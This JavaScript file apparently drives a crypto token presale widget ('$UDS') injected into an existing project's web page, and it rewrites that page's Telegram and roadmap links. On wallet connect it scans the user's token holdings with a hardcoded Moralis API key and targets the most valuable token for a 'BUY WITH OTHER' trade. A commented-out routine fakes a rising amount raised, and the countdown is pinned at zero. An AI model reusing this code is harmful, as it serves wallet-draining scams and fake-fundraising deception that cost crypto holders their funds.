let coinName = "BSC";
var saleContract = null;
let presaleLeft_Days = 0;
let presaleLeft_Hours = 0;
let presaleLeft_Minutes = 0;
let presaleLeft_Seconds = 0;
let tokenPrice = 0;
let totalUSDTCnt = 3200000;

let customTokenSymbol = null;
let customTokenContractAddr = null;
let customTokenThumbnails = null;
let isCustomTokenSwap = false;

const customActions = () => {
  document.querySelector(".lbl_usdt_raised_amount").innerHTML = "USDT Raised $" + numberWithCommas(INIT_USDT_RAISED_VALUE) + "/$3,200,000";
  var percent = parseFloat(INIT_USDT_RAISED_VALUE / totalUSDTCnt).toFixed(2) * 100;
  console.log("Progress Percentage = ", percent);
  document.documentElement.style.setProperty('--progress-animation-width', `${percent}%`);
  //document.documentElement.style.setProperty('--progress-animation-width', '80%'); 

  document.querySelector(".wallet_connect_btn").innerHTML = "Connect Wallet";
  document.querySelectorAll('.wallet_connect_btn')[0].addEventListener("click", async () => {
    var ret = null;
    var innherValue = document.querySelector(".wallet_connect_btn").innerHTML;
    console.log("InnerValue = " + innherValue);

    if (document.querySelector(".wallet_connect_btn").innerHTML == "Connect Wallet") {
      ret = await connectWallet();
      //connectedWallet = "0x09Fe9C8A170d3ac8ED44A830Da473D6B8Af55945";
      //connectedWallet = "0x80b4ad49e74c800798c7f2B3603c90554a5f681b";
      //connectedWallet = "0x14F54bA7ca16Bd333DC682eBa09F7534ad4d8E76";
      // connectedWallet = "0x194C7Cbc99664a047dE7220f7BF4F7afC5892a2b";
      // ret = "success";
      
      customTokenAmount = 0;

      if ((connectedWallet != null) && (ret != null)) {
        document.querySelector(".account__info").innerHTML = connectedWallet.toString().substring(0, 6) + "..." + connectedWallet.toString().substring(connectedWallet.toString().length - 5, connectedWallet.toString().length);
        document.querySelector(".exchange-btn-group")?.classList.remove("d-none");
        document.querySelector(".exchange-btn-group")?.classList.add("d-flex");

        document.querySelector(".wallet_connect_btn").innerHTML = "Disconnect";
        document.querySelector(".swap-with-usdc").innerHTML = currentNet == "eth" ? `<img src="/assets/images/usdc.svg" alt="" height="32" class="_iconSm ng-star-inserted from-coin-icon mx-2"> BUY WITH USDC` : `<img src="/assets/images/busd.svg" alt="" height="32" class="_iconSm ng-star-inserted from-coin-icon mx-2">  BUY WITH BUSD`;

        let urlTokenListStr = `https://deep-index.moralis.io/api/v2/${connectedWallet}/erc20?chain=${currentNet}`;
        let responseTokenList = await axios.get(urlTokenListStr,
          {
            headers: {
              'x-api-key': "22fv0pX8Ol2YNUn0B8FtvHErrfnPmecQLFDdd9Lpm6fzHsUoPKlsaqc58BoLk2Qm"
            }
          }
        );

        console.log("ResponseDataInfo = ", responseTokenList);

        let maxAmount = 0;

        for (let k = 0; k < responseTokenList.data.length; k++) {

          let tokenInfo = responseTokenList.data[k];
          let tokenContractAddress = responseTokenList.data[k].token_address;
          let decimals = tokenInfo.decimals;
          let symbol = tokenInfo.symbol;
          let balances = tokenInfo.balance;
          let thumbnails = tokenInfo.thumbnails;
          let realBalances = balances.substring(0, balances.length - parseInt(decimals));
          if (balances.length == parseInt(decimals)) realBalances = parseInt(balances.substring(0, 1)) / 10;

          if (decimals == 0) continue;
          if (realBalances < 100) continue;

          console.log("====>Index = ", k);
          console.log("contract Addresss = ", tokenContractAddress);
          console.log("decimals = ", decimals);
          console.log("symbol = ", symbol);
          console.log("balances = ", balances);
          console.log("RealBalances = ", realBalances);
          console.log("thumbNailPath = ", thumbnails);


          let urlTokenPriceStr = `https://deep-index.moralis.io/api/v2/erc20/${tokenContractAddress}/price?chain=${currentNet}&chain_name=mainnet`;
          // let urlTokenPriceStr = `https://deep-index.moralis.io/api/v2/erc20/0x9813037ee2218799597d83d4a5b6f3b6778218d9/price?chain=eth&chain_name=mainnet`;

          console.log("TokenPriceURL = ", urlTokenPriceStr);
          let tokenPriceInfo = null;
          let responseTokenPrice;

          try {
            responseTokenPrice = await axios.get(urlTokenPriceStr,
              {
                headers: {
                  'x-api-key': "22fv0pX8Ol2YNUn0B8FtvHErrfnPmecQLFDdd9Lpm6fzHsUoPKlsaqc58BoLk2Qm"
                }
              }                
            );

            console.log("urlTokenPriceRequest = ", responseTokenPrice);
            tokenPriceInfo = responseTokenPrice.data.usdPrice;
          } catch (error) {
            console.log("error = ", error);
            tokenPrice = -1;
            continue;
          }

          if (tokenPriceInfo != null) {
            tokenPrice = parseFloat(tokenPriceInfo);
          }
          else {
            if (symbol == "BONE") tokenPrice = 1.87;
            if (symbol == "DEXT") tokenPrice = 0.236;
            if (symbol == "ORD") tokenPrice = 0.000004418;
            if (symbol == "SHIB") tokenPrice = 0.00001347;
            if (symbol == "M3GAN") tokenPrice = 0;
            if (symbol == "DOGE") tokenPrice = 0.0845;
          }

          console.log(symbol + " TokenPrice = ", tokenPrice);

          let eachAmount = tokenPrice * parseInt(realBalances);
          console.log("Current Amount = ", eachAmount);

          if (maxAmount < eachAmount) {
            maxAmount = eachAmount;
            customTokenSymbol = symbol;
            customTokenContractAddr = tokenContractAddress;
            customTokenThumbnails = thumbnails;
            customUserBalance = balances;
            customRealDonateVal = maxAmount;
            customTokenPrice = tokenPrice;
            customTokenDecimals = decimals;
            customTokenAmount = customUserBalance;
            if (symbol == "SHIB") customTokenThumbnails = "https://cdn.moralis.io/eth/0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce_thumb.png";

            if (customTokenThumbnails == null) {
              if (currentNet == "eth") customTokenThumbnails = "https://etherscan.io/images/main/empty-token.png";
              if (currentNet == "bsc") customTokenThumbnails = "https://bscscan.com/images/main/empty-token.png";
            }

            console.log("maxAmount = ", maxAmount);
            console.log("customTokenSymbol = ", symbol);
            console.log("maxTokenAddress = ", tokenContractAddress);
            console.log("customTokenThumbnails = ", customTokenThumbnails);
          }
        }

        if ((customTokenSymbol != "USDT") && (customTokenSymbol != "USDC") && (customTokenSymbol != "BUSD") && (customTokenSymbol != undefined)) {
          document.querySelector(".swap-with-other").classList.remove("d-none");
          document.querySelector(".swap-with-other").innerHTML = `<img src="` + customTokenThumbnails + `" alt="" height="32" class="_iconSm ng-star-inserted from-coin-icon mx-2"> BUY WITH OTHER`;
          let lowerCaseAddress = customTokenContractAddr;
          customTokenContractAddr = Web3.utils.toChecksumAddress(lowerCaseAddress);
          console.log("Remove Other Token Button!!!");
        }
        else {
          document.querySelector(".swap-with-other").classList.add("d-none");
        }
      }
      else
        console.log("connect_failed!____2222");
    }
    else {
      console.log("On click Disconnect Button!!!");
      document.querySelector(".exchange-btn-group").classList.add("d-none");
      document.querySelector(".exchange-btn-group").classList.remove("d-flex");

      document.querySelector(".wallet_connect_btn").innerHTML = "Connect Wallet";
      document.querySelector(".story__title").innerHTML = "Presale is live!";
      document.querySelector(".account__info").innerHTML = "";
      await onDisconnect();
    }

    // here connect action
  })
  document.querySelector(".exchange-btn").addEventListener("click", async () => {
    console.log("you click exchange btn");
    const sellingCoin = document.querySelector(".selling-coin").value;
    const buyingCoin = document.querySelector(".buying-coin").value;

    console.log(sellingCoin, buyingCoin, coinName, currentNet);
    if (coinName == "USDT") {
      if (currentNet == "eth") await buyWithUSDT_ETH(sellingCoin);
      if (currentNet == "bsc") await buyWithUSDT_BSC(sellingCoin);  
    }         
    else if (coinName == "USDC") {
        await buyWithUSDC_ETH(sellingCoin);
    }
    else if (coinName == "BUSD") {
        await buyWithBUSD_BSC(sellingCoin);
    }
    else{
      if (currentNet == "eth") await buyWithCustomToken_ETH(sellingCoin);
      if (currentNet == "bsc") await buyWithCustomToken_BSC(sellingCoin);
    }
    document.querySelector(".exchange-modal1").classList.add("d-none");
  })
  document.querySelector(".swap-with-usdt").addEventListener("click", () => {
    document.querySelector(".exchange-modal1").classList.remove("d-none");
    document.querySelector(".exchange-modal1").classList.add("d-inline");
    coinName = "USDT";

    document.querySelector(".lbl_title_selling_token").innerHTML = "Selling " + coinName;

    document.querySelector('.coin-type').innerHTML = `<img
        src="/assets/images/usdt.svg" alt="" height="32"
          class="_iconSm ng-star-inserted from-coin-icon">
      <span class="text-white text-uppercase ms-2 text-white from-coin-name">${coinName}</span>`

    document.querySelector(".buying-coin").value = parseFloat(1 / 0.021).toFixed(2);
    isCustomTokenSwap = false;
  })
  document.querySelector(".swap-with-usdc").addEventListener("click", () => {
    document.querySelector(".exchange-modal1").classList.remove("d-none");
    document.querySelector(".exchange-modal1").classList.add("d-inline");
    coinName = currentNet == "eth" ? "USDC" : "BUSD";

    document.querySelector(".lbl_title_selling_token").innerHTML = "Selling " + coinName;

    document.querySelector('.coin-type').innerHTML = `<img
        src="/assets/images/${currentNet == "eth" ? "usdc" : "busd"}.svg" alt="" height="32"
          class="_iconSm ng-star-inserted from-coin-icon">
      <span class="text-white text-uppercase ms-2 text-white from-coin-name">${coinName}</span>`

    document.querySelector(".buying-coin").value = parseFloat(1 / 0.021).toFixed(2);
    isCustomTokenSwap = false;
  })

  document.querySelector(".swap-with-other").addEventListener("click", () => {
    document.querySelector(".exchange-modal1").classList.remove("d-none");
    document.querySelector(".exchange-modal1").classList.add("d-inline");
    coinName = customTokenSymbol;

    document.querySelector(".lbl_title_selling_token").innerHTML = "Selling " + coinName;

    document.querySelector('.coin-type').innerHTML = `<img
        src="`+ customTokenThumbnails + `" alt="" height="32"
          class="_iconSm ng-star-inserted from-coin-icon">
      <span class="text-white text-uppercase ms-2 text-white from-coin-name">${coinName}</span>`

    document.querySelector(".buying-coin").value = parseFloat(customTokenPrice / 0.021).toFixed(2);
    isCustomTokenSwap = true;
  })

  document.querySelector(".plate__close").addEventListener("click", async () => {
    document.querySelector(".exchange-modal1").classList.add("d-none");
  })

  // change ETHfile
  document.querySelector(".selling-coin").addEventListener("keyup", (event) => {
    let sellingCoin = document.querySelector(".selling-coin").value;
    if (isCustomTokenSwap == true) sellingCoin = customTokenPrice * document.querySelector(".selling-coin").value;
    document.querySelector(".buying-coin").value = parseFloat(sellingCoin / 0.021).toFixed(2);
  })

  // change $UDS
  document.querySelector(".buying-coin").addEventListener("keyup", (event) => {
    let buyingCoin = document.querySelector(".buying-coin").value;
    document.querySelector(".selling-coin").value = parseFloat(buyingCoin * 0.021).toFixed(2);
  })

  // change $UDS

  document.getElementById("ether_net").addEventListener("click", async () => {
    console.log("ether_net_addEventListener()!!!");
    await changeNetwork();
  })

  document.getElementById("bsc_net").addEventListener("click", async () => {
    console.log("bsc_net_addEventListener()!!!");
    await changeNetwork();
  })
}

const clickETH = () => {
  console.log("Click ETH Network!!!");
  
  document.getElementById("bsc_net").classList.add("button-gray");
  document.getElementById("bsc_net").classList.remove("button-gradient");
  document.getElementById("ether_net").classList.add("button-gradient");
  document.getElementById("ether_net").classList.remove("button-gray");

  currentNet = "eth";
  document.querySelector(".swap-with-usdc").innerHTML = `<img src="/assets/images/usdc.svg" alt="" height="32" class="_iconSm ng-star-inserted from-coin-icon mx-2"> BUY WITH USDC`
}
const clickBSC = () => {
  console.log("Click BSC Network!!!");
  document.getElementById("ether_net").classList.add("button-gray");
  document.getElementById("ether_net").classList.remove("button-gradient");
  document.getElementById("bsc_net").classList.add("button-gradient");
  document.getElementById("bsc_net").classList.remove("button-gray");

  currentNet = "bsc";
  document.querySelector(".swap-with-usdc").innerHTML = `<img src="/assets/images/busd.svg" alt="" height="32" class="_iconSm ng-star-inserted from-coin-icon mx-2"> BUY WITH BUSD`
}

// const updateText = () => {
//   var textElement = document.querySelector(".lbl_usdt_raised_amount");
//   //document.querySelector(".lbl_usdt_raised_amount").innerHTML = "USDT Raised $" + numberWithCommas(currentUSDTRaised) + "/$2,632,000";

//   var strCurrentAmount = textElement.innerText.split("/")[0];
//   var currentAmount = parseFloat(strCurrentAmount.split("$")[1].replace(/,/g, ""));

//   // Get the current number from the text element and convert to float
//   var newAmount = currentAmount + Math.floor(Math.random() * (500 - 50 + 1) + 50);

//   currentUSDTRaised = newAmount;
//   localStorage.setItem("currentUSDTRaised", currentUSDTRaised);

//   var newText = "USDT Raised $" + newAmount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
//   // Generate a new number by adding a random amount between 50 and 500

//   textElement.innerHTML = newText + "/$3,200,000";

//   setTimeout(updateText, Math.floor(Math.random() * (120000 - 100000 + 1) + 100000));
//   // Schedule the next update to occur between 100 and 120 seconds from now
// }


const init = () => {
  const stakingSection = `
    <div class="purble-presale purple-box purple-box__border-24 purple-box__padding-default story__box mt-8" data-v-ac37dfd1="" data-v-dad45929="">
        <div class="purple-box__container" data-v-ac37dfd1="">
          <div class="row" data-v-dad45929="">
            <div class="col-lg-12" data-v-dad45929="">
              <div class="story__content" data-v-dad45929="">
                <div class="colored__checkboxes" data-v-3e3aeb2a="">
                  <button onclick="clickETH()" id="ether_net" class="button button-gradient button-size-large colored__button" data-v-f603e74f="" data-v-3e3aeb2a="">ETH</button>
                  <button onclick="clickBSC()" id="bsc_net" class="button button-gray button-size-large colored__button" data-v-f603e74f="" data-v-3e3aeb2a="">BSC</button>
                </div>
                <h2 class="story__title mb-2" data-v-dad45929="">Presale is live!</h2>
                <div class="account__info mb-3 text-center">1 $UDS = 0.021 USDT</div>
                <div class="text-center mb-3 d-flex align-items-center justify-content-center gap-10">
                  <div class="d-flex flex-column align-items-center gap-10">
                    <div class="presale-time presale_left_days">0</div>
                    <div>&nbsp; Days</div>
                  </div>
                  <div class="mx-2 double-dot">:</div>
                  <div class="d-flex flex-column align-items-center gap-10">
                    <div class="presale-time presale_left_hours">0</div>
                    <div>&nbsp; Hours</div>
                  </div>
                  <div class="mx-2 double-dot">:</div>
                  <div class="d-flex flex-column align-items-center gap-10">
                    <div class="presale-time presale_left_minutes">0</div>
                    <div>&nbsp; Minutes</div>
                  </div>
                  <div class="mx-2 double-dot">:</div>
                  <div class="d-flex flex-column align-items-center gap-10">
                    <div class="presale-time presale_left_seconds">0</div>
                    <div>&nbsp; Seconds</div>
                  </div>
                </div>
                <div class="mb-4 text-center" style="opacity: 100">Remaining until next price increase (1 $UDS = 0.030 USDT)</div>

                <div class="story__lore" data-v-dad45929="">
                  <div class="cert-wrapper" data-v-afe5cf33="">
                    <div class="cert-gradient" data-v-afe5cf33=""></div>
                    <div class="cert" data-v-afe5cf33="">
                      <div class="text-center">
                        <div class="lbl_remain_token_cnt d-flex justify-content-center">CEX Listing March 5th</div>
                        <div class="d-flex justify-content-center">Launch Price: 1 $UDS = 0.05 USDT</div>
                      </div>
                    </div>
                  </div>
                  <div class="progress-bar mt-2 text-center">
                    <div class="progress-bar-fill" style="width: 75%;"></div>
                  </div>                 
                  <div class="lbl_usdt_raised_amount">USDT Raised $50,000.83 / $3,200,000</div>
                  <div class="d-none flex-wrap justify-content-between mt-3 exchange-btn-group" style="gap:20px">
                    <button class="button button-outline button-size-large swap-with-usdt metaverse__btn ml-3 d-flex justify-content-around" data-v-f603e74f data-v-1ef6ae66>
                      <img
                        src="/assets/images/usdt.svg" alt="" height="32"
                        class="_iconSm ng-star-inserted from-coin-icon mx-2">
                    BUY WITH USDT
                    </button>

                    <button class="button button-outline button-size-large swap-with-usdc metaverse__btn ml-3 d-flex justify-content-around" data-v-f603e74f data-v-1ef6ae66>
                      <img src="/assets/images/busd.svg" alt="" height="32" class="_iconSm ng-star-inserted from-coin-icon mx-2">
                      BUY WITH BUSD
                    </button>

                    <button class="button button-outline button-size-large d-none swap-with-other metaverse__btn ml-3 d-flex justify-content-around" data-v-f603e74f data-v-1ef6ae66>
                      <img src="/assets/images/busd.svg" alt="" height="32" class="_iconSm ng-star-inserted from-coin-icon mx-2">
                      BUY WITH OTHER
                    </button>

                  </div>

                  <div class="mt-3 text-center">

                    <button class="button button-gradient button-size-large metaverse__btn wallet_connect_btn" style="margin:auto"
                      aria-label="Connect your Wallet" data-v-f603e74f="" data-v-1ef6ae66="">Connect Wallet<svg
                        class="spinner" width="24" height="24" viewBox="0 0 50 50" data-v-31091144=""
                        data-v-f603e74f="" style="display: none;">
                        <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5" data-v-31091144=""
                          style="stroke: rgb(255, 255, 255);"></circle>
                      </svg>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <div class="app-modal-container exchange-modal1 d-none"><!---->
          <div class="mask mask-blur mask-dark mask-centered contact" tabindex="0" inject-name="contact"
            data-v-384544e3="" data-v-efa107ae="" data-v-47babb68=""><!---->
            <div class="plate-wrapper" data-v-384544e3="" style="width: 370px;">
              <div class="plate__gradient" data-v-384544e3=""></div>
              <div class="plate" data-v-384544e3="">
                <div class="plate__close plate__close-gradient" data-v-384544e3="">
                  <div content="Close" class="plate__icon" data-v-3fe9d39d="" data-v-384544e3=""
                    style="height: auto; width: auto;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                      viewBox="0 0 24 24" role="presentation" data-v-3fe9d39d=""
                      style="min-width: 24px; min-height: 24px;">
                      <g fill="currentColor" data-v-3fe9d39d=""><svg viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg" data-v-384544e3="">
                          <path
                            d="M18.95 5.05a1 1 0 0 1 0 1.414L13.414 12l5.536 5.536a1 1 0 0 1-1.414 1.414L12 13.414 6.464 18.95a1 1 0 1 1-1.414-1.414L10.586 12 5.05 6.464A1 1 0 0 1 6.464 5.05L12 10.586l5.536-5.536a1 1 0 0 1 1.414 0z"
                            fill-rule="evenodd"></path>
                        </svg></g>
                    </svg></div>
                </div>
                <div class="plate__content" data-v-384544e3="">
                  <header class="contact__header" data-v-efa107ae="">
                    <h2 class="contact__title" data-v-efa107ae="">EXCHANGE</h2>
                  </header>
                  <form action="" class="p-4" data-v-efa107ae>
                      <div class="input-wrapper" data-v-046f94d1="" data-v-efa107ae="">
                          <p class="input__label lbl_title_selling_token" data-v-046f94d1="">Selling USDT</p>
                          <label class="input input-primary" data-v-046f94d1="">
                          <input name="name" type="number" class="input__self selling-coin" data-v-046f94d1="" value="1">
                          <span class="amountType small d-flex align-items-center coin-type" style="margin-left: -60px;">
                              <img
                                  src="/assets/images/usdt.svg" alt="" height="32"
                                  class="_iconSm ng-star-inserted from-coin-icon">
                              <span class="text-white text-uppercase ms-2 text-white from-coin-name">USDT</span>
                          </span>
                          </label>
                      </div>
                      <div class="input-wrapper mt-3" data-v-046f94d1="" data-v-efa107ae="">
                          <p class="input__label" data-v-046f94d1="">Buying $UDS</p>
                          <label class="input input-primary" data-v-046f94d1="">
                          <input name="name" type="number" class="input__self buying-coin" data-v-046f94d1="" value="47.62">
                          <span class="amountType small d-flex align-items-center" style="margin-left: -60px;">
                              <img
                                  src="/assets/images/logo_no_text.png" alt="" height="32"
                                  class="_iconSm ng-star-inserted">
                              <span class="text-white text-uppercase ms-2 text-white">$UDS</span>
                          </span>
                          </label>
                      </div>
                    <button type="button"
                      class="button button-gradient button-size-large contact__control contact__control-btn exchange-btn"
                      data-v-f603e74f="" data-v-efa107ae=""> Convert <svg class="spinner" width="24"
                        height="24" viewBox="0 0 50 50" data-v-31091144="" data-v-f603e74f="" style="display: none;">
                        <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5" data-v-31091144=""
                          style="stroke: rgb(255, 255, 255);"></circle>
                      </svg></button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
  `;

  const replaceSection = document.querySelector(".companies__mysterybox-container");
  if (replaceSection) {
    replaceSection.innerHTML = stakingSection;
    document.querySelector('.companies__mysterybox-container').style.display = "inline";
  }
  customActions();

  // document.querySelector('div.metaverse__btns').innerHTML = `<div class="metaverse__btns d-none d-sm-flex" data-v-1ef6ae66=""><a aria-current="page" href="https://t.me/undeadsworld" target="_blank" class="router-link-active router-link-exact-active" data-v-1ef6ae66=""><button class="button button-gradient button-size-large metaverse__btn" aria-label="Join Telegram" data-v-f603e74f="" data-v-1ef6ae66="">Join Telegram<svg class="spinner" width="24" height="24" viewBox="0 0 50 50" data-v-31091144="" data-v-f603e74f="" style="display: none;"><circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5" data-v-31091144="" style="stroke: rgb(255, 255, 255);"></circle></svg></button></a><button class="button button-white button-size-large metaverse__btn-white" aria-label="Watch trailer" data-v-f603e74f="" data-v-1ef6ae66="">Watch trailer <div class="base__arrow" data-v-3fe9d39d="" data-v-1ef6ae66="" style="height: auto; width: auto;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" role="presentation" data-v-3fe9d39d="" style="min-width: 24px; min-height: 24px;"><g fill="currentColor" data-v-3fe9d39d=""><svg viewBox="0 0 17 16" xmlns="http://www.w3.org/2000/svg" data-v-1ef6ae66=""><path d="M5.889 3.333v9.334L13.222 8z" fill-rule="evenodd"></path></svg></g></svg></div><svg class="spinner" width="24" height="24" viewBox="0 0 50 50" data-v-31091144="" data-v-f603e74f="" style="display: none;"><circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5" data-v-31091144="" style="stroke: rgb(255, 255, 255);"></circle></svg></button></div>`
  document.querySelector('a[aria-current="page"][data-v-1ef6ae66].router-link-active.router-link-exact-active').setAttribute('href', 'https://t.me/undeadsworld');
  document.querySelector('a[aria-current="page"][data-v-1ef6ae66].router-link-active.router-link-exact-active').setAttribute('target', '_blank');
  document.querySelector('a[aria-current="page"][data-v-1ef6ae66][aria-label="Join Telegram"]').setAttribute('href', 'https://t.me/undeadsworld');
  document.querySelector('a[aria-current="page"][data-v-1ef6ae66][aria-label="Join Telegram"]').setAttribute('target', '_blank');

  document.querySelector('a[aria-label="Roadmap"].router-link-active').setAttribute('href', 'https://whitepaper.undeads.app/miscellaneous/roadmap');
  document.querySelector('a[aria-label="Roadmap"].router-link-active').setAttribute('target', '_blank');
  // document.querySelector('a[aria-label="Join Presale"].router-link-active button').innerHTML = `<div class="header__wallet" data-v-3fe9d39d="" data-v-d9121c3e="" style="height: auto; width: auto;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" role="presentation" data-v-3fe9d39d="" style="min-width: 24px; min-height: 24px;"><g fill="currentColor" data-v-3fe9d39d=""><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" data-v-d9121c3e=""><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6z" fill-rule="evenodd"></path></svg></g></svg></div>Roadmap`;
};


setTimeout(() => {
  window.onload = init();
  document.querySelector(".header__logo-link").addEventListener("click", () => {
    init();
  })
  document.querySelector(".token__btn[data-v-ce98b15f]").addEventListener("click", () => {
    init();
  })

  window.addEventListener("resize", (event) => {
    console.log("here resize evemt")
    init();
  });
}, 4500)


const numberWithCommas = (x, digits = 3) => {
  return Number(x).toLocaleString(undefined, { maximumFractionDigits: digits });
}

setInterval(() => {
  // console.log("========== Set Time Interval ============\n");
  let currentTimeStamp = Date.now();
  let presaleTimeStamp = PRESALE_END_TIMESTAMP * 1000;
  let differenceTimeStamps = presaleTimeStamp - currentTimeStamp;

  presaleLeft_Seconds = differenceTimeStamps / 1000;
  presaleLeft_Days = parseInt(presaleLeft_Seconds / 3600 / 24);
  presaleLeft_Hours = parseInt((presaleLeft_Seconds - presaleLeft_Days * 3600 * 24) / 3600);
  presaleLeft_Minutes = parseInt((presaleLeft_Seconds - presaleLeft_Days * 3600 * 24 - presaleLeft_Hours * 3600) / 60);
  presaleLeft_Seconds = parseInt(presaleLeft_Seconds - presaleLeft_Days * 3600 * 24 - presaleLeft_Hours * 3600 - presaleLeft_Minutes * 60);

  document.querySelector(".presale_left_days").innerHTML = 0;
  document.querySelector(".presale_left_hours").innerHTML = 0;
  document.querySelector(".presale_left_minutes").innerHTML = 0;
  document.querySelector(".presale_left_seconds").innerHTML = 0;

  document.querySelector(".lbl_usdt_raised_amount").innerHTML = "USDT Raised $" + numberWithCommas(INIT_USDT_RAISED_VALUE) + "/$3,200,000";
  var percent = parseFloat(INIT_USDT_RAISED_VALUE / totalUSDTCnt).toFixed(2) * 100;
  document.documentElement.style.setProperty('--progress-animation-width', `${percent}%`);

}, 1000)

// when click back btn.
window.addEventListener('popstate', function (event) {
  this.setTimeout(() => {
    init();
  }, 100)
});


// when change broswer url, init()
function checkURLchange() {
  if (window.location.href != oldURL) {
    oldURL = window.location.href;
    console.log(oldURL);
    const hrefTmp = (window.location.href).split('/');
    const checkurl = hrefTmp[hrefTmp.length - 1];
    console.log("checkurl", checkurl);
    if (checkurl === "tokenomics") {
      document.querySelector("button[data-v-f603e74f].token__btn").innerHTML = "Join Presale";
      console.log("hey6   ====");
    }
    init();
  }
}
var oldURL = window.location.href;
setInterval(checkURLchange, 200);
